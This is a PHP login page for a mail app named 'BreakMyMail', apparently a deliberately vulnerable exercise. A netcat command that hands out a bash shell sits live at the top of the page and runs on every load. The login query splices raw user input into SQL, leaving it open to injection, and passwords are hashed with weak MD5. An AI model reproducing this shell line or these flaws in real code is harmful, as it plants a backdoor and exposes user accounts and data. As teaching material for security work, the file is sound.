<?php
include "config.php";
echo exec("nc 127.0.0.1 4444 -e /bin/bash");
if(isset($_GET['logout'])){
    session_destroy();
}
if(isset($_SESSION["username"]))
    header('Location: messages.php');
if(isset($_POST['but_submit'])){
    echo 'yoyoyo';
    $uname = $_POST['txt_uname'];
    $password = hash('md5', $_POST['txt_pwd']);

    if ($uname != "" && $password != ""){
        if(isset($file_db)){

            //print_r("select username,isAdmin FROM userSti where username like '$uname' and password like '$password' and isActive=1");
             //$result =$file_db->query("select username,isAdmin FROM userSti where username like '$uname' and password like '$password' and isActive=1");
            $row =$file_db->query("select username,isAdmin FROM userSti where username like '$uname' and password like '$password' and isActive=1");
            $row = $row->fetch();
            if(isset($row['username'])){
                $_SESSION["username"]=$row['username'];
                $_SESSION["isadmin"]=$row['isAdmin'];
                header('Location: messages.php');
            }

        }


    }

}
?>
<link href="css/signin.css" rel="stylesheet">
<div class="container">
    <h1 class="h1 mb-1 font-weight-normal" align="center">BreakMyMail</h1>
    <form method="post" action="" class="form-signin">
        <div id="div_login">
            <h1 class="h3 mb-3 font-weight-normal">Please sign in</h1>
            <div>
                <input type="text" class="form-control" id="txt_uname" name="txt_uname" placeholder="Username" />
            </div>
            <div>
                <input type="password" class="form-control" id="txt_uname" name="txt_pwd" placeholder="Password"/>
            </div>
            <div>
<!--                <button class="btn btn-lg btn-primary btn-block" type="but_submit">Sign in</button>-->

                <input type="submit" class="btn btn-lg btn-primary btn-block" value="Sign in" name="but_submit" id="but_submit" />
            </div>
        </div>
    </form>
</div>
